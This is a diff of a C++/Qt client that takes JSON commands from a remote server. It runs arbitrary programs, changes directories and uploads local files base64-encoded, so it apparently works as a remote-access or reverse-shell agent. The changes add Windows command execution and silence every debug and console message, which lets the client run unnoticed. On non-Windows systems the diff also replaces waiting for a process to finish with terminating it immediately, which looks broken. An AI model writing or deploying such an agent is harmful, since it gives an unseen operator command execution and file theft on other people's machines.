@@ -1,4 +1,6 @@
 #include "client.h"
+#include "utility.h"
+
 #include <QProcess>
 #include <QString>
 #include <QDebug>
@@ -11,10 +13,8 @@
 #include <QFile>
 
 #include <memory>
-#include <filesystem>
+//#include <filesystem>
 #include <iostream>
-
-#include "config.hpp"
 
 
 Client::Client(QTcpSocket *parent)
@@ -33,13 +33,15 @@ void Client::connectToServer()
 void Client::cmdReceived(QJsonObject d)
 {
     auto program = d.value("program").toString();
+    //std::cout << "Programm: " << program.toStdString() << std::endl;
     if (program == "cd")
     {
         try
         {
-            std::filesystem::current_path(d.value("args").toString().toStdString());
+            //std::filesystem::current_path(d.value("args").toString().toStdString());
+            util::Utility::setCurrendDir(d.value("args").toString().toStdString());
         }
-        catch (std::filesystem::filesystem_error &err)
+        catch (util::DirNotFound &err)
         {
             sendResponse(QString::fromStdString(err.what()));
         }
@@ -58,6 +60,12 @@ void Client::cmdReceived(QJsonObject d)
 
 void Client::executeCommand(const QString &program, const QString &args)
 {
+#ifdef __WIN32
+    auto cmd = program + " " + args;
+    //std::cout << "Command: " << cmd.toStdString() << std::endl;
+    auto result = util::Utility::excuteCommand(cmd.toStdString());
+    sendResponse(QString::fromStdString(result));
+#else
     std::unique_ptr<QProcess> p(new QProcess);
     p->setProcessChannelMode(QProcess::MergedChannels);
     p->setProgram(program);
@@ -70,15 +78,16 @@ void Client::executeCommand(const QString &program, const QString &args)
     }
     p->start();
     p->waitForStarted();
-    p->waitForFinished();
+    p->terminate();
 
     sendResponse(p->readAll());
+#endif
 }
 
 void Client::sendFile(const QString &fileName)
 {
     QFile *file = new QFile(fileName);
-    qDebug() << "File: " << file->fileName();
+    //qDebug() << "File: " << file->fileName();
     if (!file->exists())
     {
         sendResponse("File: " + file->fileName() + " doesn't exists!\n");
@@ -87,19 +96,20 @@ void Client::sendFile(const QString &fileName)
 
     if (file->open(QIODevice::ReadOnly))
     {
-        qDebug() << "Uploading file..." << file->fileName();
+        //qDebug() << "Uploading file..." << file->fileName();
         sendResponse("Uploading file...\n");
         QByteArray data = file->readAll();
-        qDebug() << "[OK]File read";
+        //qDebug() << "[OK]File read";
         sendResponse(file->fileName(), data);
     }
 }
 
 void Client::sendResponse(const QString &response)
 {
+    //std::cout << response.toStdString() << std::endl;
     QJsonObject jObj;
     jObj["res"] = response;
-    jObj["cwd"] = QString::fromStdString(std::filesystem::current_path());
+    jObj["cwd"] = QString::fromStdString(util::Utility::currentDir());
 
     QDataStream stream(this);
 
@@ -110,27 +120,27 @@ void Client::sendResponse(const QString &response)
 
 void Client::sendResponse(const QString &response, const QByteArray &data)
 {
-    qDebug() << "Preparing JSON...";
+    //qDebug() << "Preparing JSON...";
     QString dataBase64;
     try {
         dataBase64 = data.toBase64();
     }  catch (std::bad_alloc &err)
     {
-        std::cout << "Bad alloc error, file too large... " << err.what() << std::endl;
+        //std::cout << "Bad alloc error, file too large... " << err.what() << std::endl;
         sendResponse("Bad alloc");
         return;
     }
 
     QJsonObject jData;
     jData["res"] = "Data received: " + response + "\n";
-    jData["cwd"] = QString::fromStdString(std::filesystem::current_path());
+    jData["cwd"] = QString::fromStdString(util::Utility::currentDir());
     jData["data"] = dataBase64;
     jData["filename"] = response.split("/").last();
 
-    qDebug() << "Json ready...";
+   // qDebug() << "Json ready...";
 
     QDataStream stream(this);
-    qDebug() << "Sending JSON...";
+    //qDebug() << "Sending JSON...";
     stream << QJsonDocument(jData).toJson(QJsonDocument::Compact);
 }
 
